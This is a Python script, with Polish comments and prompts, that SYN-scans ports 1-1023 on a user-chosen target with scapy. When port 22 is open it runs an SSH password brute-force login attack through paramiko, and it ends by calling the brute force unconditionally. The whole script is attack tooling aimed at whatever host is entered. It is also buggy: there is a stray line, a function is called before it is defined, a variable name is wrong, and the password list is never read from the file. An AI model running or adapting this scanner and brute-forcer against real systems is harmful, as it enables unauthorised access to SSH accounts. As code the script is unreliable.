#dziaa tylko na linuxie
import scapy.sendrecv
from scapy.all import *
import paramiko

Target = input("Podaj target: ")

Registred_Ports = range(1,1024)

open_ports = []

conf.verb = 0 #powstrzymuje funkcje przed drukowanie niechcianych wiadomości.

def scanport(port=0):
    source_port = scapy.volatile.RandShort()
    Synchronization_Packet = scapy.sendrecv.sr1(scapy.layers.inet.IP(dst=Target) /
                                                scapy.layers.inet.TCP(sport=source_port,
                                                dport=port, flags="S"), timeout=0.5)
    if not Synchronization_Packet:
        #print("Nie ma odpowiedzi")
        return False
    else:
        if Synchronization_Packet.haslayer('TCP'):
            if Synchronization_Packet['TCP'].flags == 0x12:
                Packet_TCPIP = scapy.layers.inet.IP(dst=Target) / scapy.layers.inet.TCP(
                    sport=source_port, dport=port, flags="R")
                sr(Packet_TCPIP, timeout=2)
                return True
            else:
                return False
        else:
            return False

def Target_Avaibility():
        conf.verb = 0
        try:
            Packet_ICMP = scapy.layers.inet.IP(dst=Target) / scapy.layers.inet.ICMP()
            print("pinguje")
            Synchronization_Packet = sr1(packetICMP, timeout = 3)
            if not Synchronization_Packet:
                raise Exception("nie odpowiada")
            else:
                return True
        except Exception as pingError:
            print(f'wyjątek : {pingError}')
            return False

if Target_Avaibility():
    for current_Port in Registred_Ports:
        status = scanport(current_Port)
        if status :
            open_ports.append(current_Port)
    print('Skan zakończono')
    #print(f'Otwarte porty: {open_ports}')
    if open_ports.count(22):
        fuction = input("BruteForce na port 22? [y-n]: ").lower()
        if fuction == 'y':
            Brute_Force(22)
        a

else:
    print('Target nieosiągalny')
#print(open_ports)

def Brute_Force(port):
    with open('./password_List.txt') as paswordList:
        Password_list = []
        for password in Password_list:
            password = password.replace('\n','')
            Password_list.append(password)
        user = input('Podaj usera do Brute Force: ')
        ssh_Connection = paramiko.SSHClient()
        ssh_Connection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        ssh_Connection.load_system_host_keys()
        for password in Password_list:
            try:
                ssh_Connection.connect(hostname= Target, port = port, username = user,
                password = password, timeout = 1)
                print(f'Haslo poprawne: {password}')
                ssh_Connection.close()
                break


            except:
                print(f'{password} nieudane')

Brute_Force(22)







scanport(23)